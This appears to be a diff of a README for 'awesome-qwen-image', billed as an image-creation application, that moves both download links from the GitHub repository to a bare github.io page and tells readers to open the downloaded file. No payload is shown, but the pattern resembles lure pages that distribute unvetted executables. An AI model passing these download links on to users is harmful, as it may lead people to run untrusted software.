@@ -1,6 +1,6 @@
 # 🚀 awesome-qwen-image - Create Stunning Images Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--qwen--image-2ea44f?style=for-the-badge)](https://github.com/shazilh1938/awesome-qwen-image)
+[![Download Now](https://img.shields.io/badge/Download-awesome--qwen--image-2ea44f?style=for-the-badge)](https://shazilh1938.github.io)
 
 ## 👋 Welcome to awesome-qwen-image
 
@@ -29,7 +29,7 @@ Everything else you need to get up and running quickly: file conversion tools, u
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/shazilh1938/awesome-qwen-image](https://github.com/shazilh1938/awesome-qwen-image)
+Visit this link to download the application: [https://shazilh1938.github.io](https://shazilh1938.github.io)
 
 ### Step 2: Open the Downloaded File
 
